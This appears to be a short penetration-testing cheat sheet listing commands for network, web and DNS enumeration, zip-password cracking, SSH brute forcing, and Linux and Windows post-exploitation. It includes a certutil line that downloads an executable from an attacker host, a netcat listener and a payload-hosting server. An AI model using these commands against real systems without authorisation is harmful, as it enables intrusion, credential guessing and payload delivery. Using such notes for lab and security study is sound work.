## Enumeration 
arp-scan -l

showmount -e [server ip]

mount -t nfs [server ip]:[remote path shown from showmount] [to local mount point]

nmap -sV -A -T4 -p- 

nmap -sV -A -T4 --top-ports 500 [target]

nmap --sC ? 

nmap -p- --script vuln [target]

nmap --top-ports 500 --script vuln [target]

gobuster dir -u http://[IPaddress] -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --no-error -u http://[TargetIP]/ -v | grep "Status: 200"

## Web Enumeration

Curl -I http://[target]

nikto -h http://[IPaddress:8080]

## DNS enumeration (workflow)

dig -x [IP]

nslookup [IP]

dnsrecon -r [IP range/24]

dnsrecon -r [IP range/24] -n 192.168.102.1

## Cracking
Zip files: fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt [target.zip]

## Brute forcing
Hydra

nmap -p 22 --script ssh-brute --script-args="userdb=/path/to/username_wordlist.txt,passdb=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt" 192.168.64.137


## Linux Post Exploitation
history

pwd

sudo -l

crontab -l

**Linux wget and curl commands**

## Windows Post Exploitation
cd

whoami

ipconfig

dir

sc stop [application]

sc start [application]

sc query [application]

certutil.exe -urlcache -f http://[attackerip]:8000/[application.exe] [applicationname.exe]

## Listener
nc -nlvp [port]

## Directory hosting
python -m SimpleHTTPServer




